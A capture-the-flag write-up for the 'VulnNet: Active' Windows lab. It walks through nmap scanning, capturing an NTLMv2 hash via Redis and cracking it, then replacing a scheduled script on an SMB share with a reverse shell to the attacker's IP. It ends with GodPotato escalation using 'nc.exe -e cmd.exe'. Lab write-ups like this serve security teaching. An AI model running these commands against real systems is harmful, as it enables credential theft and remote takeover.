# CTF Writeup: VulnNet: Active

---

## Reconaissance

An initial scan revealed following services open.

```
nmap -n -Pn -sS -p- 10.10.172.37
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 19:08 CDT
Nmap scan report for 10.10.172.37
Host is up (0.044s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
6379/tcp  open  redis
9389/tcp  open  adws
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 256.72 seconds
```

An service detection scan revealed more information:

```
nmap -n -Pn -sSCV -p 53,135,139,445,464,6379,9389,49666,49671,49674,49677,49703 10.10.172.37
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 19:13 CDT
Nmap scan report for 10.10.172.37
Host is up (0.033s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
6379/tcp  open  redis         Redis key-value store 2.8.2402
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-21T00:14:31
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.90 seconds
```

Redis is running on the target, which is a NoSQL Database. We can connect to the Redis Database running and abuse
a strategy to potentially intercept authentification attempts utilizing kali's responder. Potentially retrieve
NTLM Hash.


```
sudo responder -I tun0 -dwv
```

Connecting to Redis CLI

```
redis-cli -h 10.10.140.188
```

A Methodology hackers exploit is tricking the server in requesting a file from our local machine (which doesn't even have to exist). 
Potentially we can intercept the authentication attempt from a running system acc within the domain.

```
CONFIG SET dir \\10.23.20.245\share\fake.dll
CONFIG SET dbfilename test.rdb
Save
```

We retrieved the NTLM Hash of enterprise-security

```
enterprise-security::VULNNET:c8d0add16830b1c6:23EECF2065252F6E393EFB71AC5A40BD:010100000000000000D851BA6D2ADC01C5270F8F38A44703000000000200080039004B004800430001001E00570049004E002D005A0044004300430049004D004300560043005000310004003400570049004E002D005A0044004300430049004D00430056004300500031002E0039004B00480043002E004C004F00430041004C000300140039004B00480043002E004C004F00430041004C000500140039004B00480043002E004C004F00430041004C000700080000D851BA6D2ADC0106000400020000000800300030000000000000000000000000300000C232FC9310976B176E90AAA562A40599E42BBB97ECB497CBE603700DFFD3DC9C0A001000000000000000000000000000000000000900240063006900660073002F00310030002E00320031002E003100350036002E003100300034000000000000000000
```

Utilizing john the ripper I can potentially enumerate an password out of the hash.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sand_0873959498  (enterprise-security)     
1g 0:00:00:01 DONE (2025-09-20 20:42) 0.8928g/s 3584Kp/s 3584Kc/s 3584KC/s sandoval69..sanat85
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
```
enterprise-security:sand_0873959498
```

Utilizing smbclient and the newly found credentials we got. I was able to list shares running on the target smb server.

```
smbclient -L \\\\10.10.140.188\\ -U enterprise-security
Password for [WORKGROUP\enterprise-security]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Enterprise-Share Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.140.188 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Logging into Enterprise-Share provided the information that I can write inside the smb share and a special file.
Observing this file gave us the following information 

```
cat PurgeIrrelevantData_1826.ps1 
rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
```

## Initial Access


The script force removes files in Public/Documents and is named PurgeirrelevantData. I'm assuming there could be a
scheduled task running this script. My initial idea is to replace the script with an script of my own. Which could
potentially provide me initial access.

Utilizing following reverse shell

```
wget https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/Shells/Invoke-PowerShellTcp.ps1
```

Added the following exec line at the bottom of my reverse shell script.

```
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.21.156.104 -Port 1234" >> PurgeIrrelevantData_1826.ps1 
```

Logged into the SMB Share Enterprise-Share again and replaced the script inside there, with my own.

```
smb: \> put PurgeIrrelevantData_1826.ps1
```

Started up a listener on port 1234

```
nc -lvnp 1234
```

Gained RCE as user "vulnnet\enterprise-security"

```
nc -lvnp 1234                                                                               
listening on [any] 1234 ...
connect to [10.21.156.104] from (UNKNOWN) [10.10.140.188] 50028
Windows PowerShell running as user enterprise-security on VULNNET-BC3TCK1
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\enterprise-security\Downloads>whoami
vulnnet\enterprise-security
```

Retrieved user.txt in C:\Users\vulnnet\Desktop

```
THM{3eb176aee96432d5b100bc93580b291e}
```

## Privilege Escalation

```
PS C:\Users\enterprise-security\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Since the SeImpersonatePrivilege is enabled, there is multiple exploits to run, which could potentially provide
elevated privs. PrintSpoofer didn't work, but GodPotato.exe worked!

Uploaded GodPotato.exe & nc.exe on target system.
and ran following command:

```
PS C:\Temp> ./GodPotato.exe -cmd "nc.exe -e cmd.exe 10.21.156.104 8888"
```

Started up a listener on port 8888

```
nc -lvnp 8888
```

Retrieved system.txt in C:\Users\Administrator\Desktop

```
THM{d540c0645975900e5bb9167aa431fc9b}
```
